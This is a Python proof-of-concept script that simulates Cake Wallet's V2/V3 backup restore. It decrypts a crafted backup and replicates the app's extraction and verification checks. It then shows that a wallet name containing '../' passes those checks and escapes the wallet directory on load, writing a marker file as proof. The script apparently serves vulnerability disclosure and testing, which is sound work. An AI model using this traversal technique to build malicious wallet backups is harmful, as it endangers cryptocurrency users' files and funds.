#!/usr/bin/env python3
"""Simulate Cake Wallet Dart restore (V2/V3) without Flutter, prove traversal fires."""
import argparse, hashlib, json, os, sqlite3, sys, tempfile, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cake_backup_compat import decrypt_v2

def is_within(parent, cand):
    import os as _os
    p=_os.path.normcase(_os.path.normpath(_os.path.abspath(parent)))
    c=_os.path.normcase(_os.path.normpath(_os.path.abspath(cand)))
    try: return _os.path.commonpath([p,c])==p
    except ValueError: return False

def vulnerable_dir(type_root, name):
    d = f"{type_root}/{name}"
    os.makedirs(d, exist_ok=True)
    return d

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--v3", required=False)
    ap.add_argument("--v2", required=False)
    ap.add_argument("--password", default="poc1234")
    ap.add_argument("--keychain-salt", default="cafebabe0011223344556677")
    a=ap.parse_args()
    src = a.v3 or a.v2
    assert src, "pass --v3 or --v2"
    print(f"[*] opening {src}")
    if a.v3:
        with zipfile.ZipFile(src) as z:
            names=z.namelist()
            print(f"[*] outer entries: {names}")
            assert "data.bin" in names and "metadata.json" in names
            meta=json.loads(z.read("metadata.json"))
            print(f"[*] metadata version={meta['version']} chunks={len(meta['chunks'])} cakeVersion={meta.get('cakeVersion')}")
            assert meta["version"]==3
            data_bin=z.read("data.bin")
            # verify chunk checksums like BackupServiceV3 does
            off=0
            plain_all=b""
            for i,ch in enumerate(meta["chunks"]):
                enc_len=ch["length"]["encrypted"]; plain_len=ch["length"]["plain"]
                chunk_enc=data_bin[off:off+enc_len]; off+=enc_len
                assert hashlib.sha512(chunk_enc).hexdigest()==ch["sha512sum"]["encrypted"], f"chunk {i} enc checksum"
                pt=decrypt_v2(a.password, chunk_enc)
                assert len(pt)==plain_len, f"chunk {i} len"
                assert hashlib.sha512(pt).hexdigest()==ch["sha512sum"]["plain"], f"chunk {i} plain checksum"
                plain_all+=pt
                print(f"  chunk {i}: enc {enc_len} -> plain {plain_len} OK")
            assert hashlib.sha512(plain_all).hexdigest()==meta["sha512sum"], "overall sha512"
            print("[*] data.bin decrypt + sha512 OK")
            inner_bytes=plain_all
    else:
        with open(src,"rb") as f: blob=f.read()
        assert blob[0]==2, "not V2"
        inner_bytes=decrypt_v2(a.password, blob)
        print("[*] V2 decrypt OK")

    tmp=tempfile.mkdtemp(prefix="cake-restore-sim-")
    print(f"[*] simulating extraction to {tmp} (safeExtractPath enforced)")
    with tempfile.NamedTemporaryFile(delete=False, suffix=".zip") as tf:
        tf.write(inner_bytes); inner_path=tf.name
    # safeExtractPath replica
    def safe(base, name):
        if not name or os.path.isabs(name): return None
        root=os.path.normpath(os.path.abspath(base))
        tgt=os.path.normpath(os.path.join(root,name))
        return tgt if is_within(root,tgt) else None
    with zipfile.ZipFile(inner_path) as z:
        for info in z.infolist():
            out=safe(tmp, info.filename)
            if out is None:
                print(f"[!] BLOCKED archive entry (good): {info.filename!r}")
                continue
            if info.is_dir():
                os.makedirs(out, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(out) or tmp, exist_ok=True)
                with open(out,"wb") as f: f.write(z.read(info.filename))
                print(f"  restored: {info.filename}")
    # verifyWallets replica
    dbp=os.path.join(tmp,"cake.db")
    assert os.path.exists(dbp), "cake.db missing after extract"
    con=sqlite3.connect(dbp)
    con.row_factory=sqlite3.Row
    infos=[dict(r) for r in con.execute('SELECT walletInfoId,id,name,"type" FROM WalletInfo')]
    print(f"[*] WalletInfo rows: {[(r['name'],r['type']) for r in infos]}")
    kept=[r for r in infos if r["type"] in (0,2,3,4,6,8,9,10,12,14,16,17,18)]
    print(f"[*] verifyWallets keeps (type-only filter): {[r['name'] for r in kept]}")
    assert any(r["name"]=="../poc-restore-escape" for r in kept), "evil row filtered?!"
    # prefs
    prefs=json.load(open(os.path.join(tmp,"~_preferences_dump"),encoding="utf-8"))
    print(f"[*] prefs current_wallet_name={prefs['current_wallet_name']!r} type={prefs['current_wallet_type']}")
    # keychain dump decrypt (needs keychainSalt+password)
    kd=open(os.path.join(tmp,"~_keychain_dump"),"rb").read()
    kj=json.loads(decrypt_v2(a.keychain_salt+a.password, kd))
    print(f"[*] keychain wallets: {[w['name'] for w in kj['wallets']]}")
    # loadCurrentWallet sink
    app_sim=os.path.join(tmp,"_app_sim"); type_root=os.path.join(app_sim,"wallets","monero")
    os.makedirs(type_root, exist_ok=True)
    evil=prefs["current_wallet_name"]
    derived=vulnerable_dir(type_root, evil)
    canon=os.path.realpath(derived); troot=os.path.realpath(type_root)
    print(f"[*] pathForWalletDir('{evil}') -> {canon}")
    print(f"[*] contained in monero root? {is_within(troot,canon)}")
    if not is_within(troot,canon):
        open(os.path.join(canon,"marker.txt"),"w").write("traversal fired\n")
        print("[+] VULNERABLE: crafted backup survives verify+prefs and escapes on load")
        print(f"[+] marker: {os.path.join(canon,'marker.txt')}")
        return 0
    print("[-] not reproduced"); return 1

if __name__=="__main__":
    sys.exit(main())
